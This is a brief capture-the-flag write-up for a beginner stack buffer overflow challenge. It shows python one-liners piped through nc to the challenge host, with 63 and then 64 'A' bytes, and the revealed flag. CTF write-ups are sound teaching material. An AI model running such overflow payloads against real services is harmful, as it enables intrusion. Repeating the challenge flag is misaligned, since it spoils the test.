Buffer Overflow 0
10

Exploit a stack based buffer overflow to get the flag.

nc basic_overflow_0.chals.fuzzy.land 5101


Solution
========

user@a6e0af5953ca ~ $ python -c 'print "A"*63' | nc basic_overflow_0.chals.fuzzy.land 5101
Nope! Needs a little more juice!
user@a6e0af5953ca ~ $ python -c 'print "A"*64' | nc basic_overflow_0.chals.fuzzy.land 5101
There you go:
 LosCTF{buff3r_0verfl00000000000000000000000w_4nd_n0w_a_fl4g}
